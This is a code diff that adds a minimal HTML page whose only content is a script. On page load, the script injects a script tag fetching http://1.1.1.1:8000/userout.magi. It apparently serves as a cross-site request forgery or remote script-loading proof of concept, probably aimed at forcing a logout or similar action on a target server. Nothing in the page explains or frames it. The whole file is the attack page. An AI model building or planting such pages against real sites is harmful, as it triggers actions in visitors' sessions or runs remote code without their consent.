@@ -1,0 +1,19 @@
+<head>
+    
+</head>
+
+<body>
+    <script>
+        function addScriptTag(src) {
+            var script = document.createElement('script');
+            script.setAttribute("type","text/javascript");
+            script.src = src;
+            document.body.appendChild(script);
+        }
+ 
+        window.onload = function () {
+            addScriptTag('http://1.1.1.1:8000/userout.magi');
+        }
+ 
+    </script>
+</body>
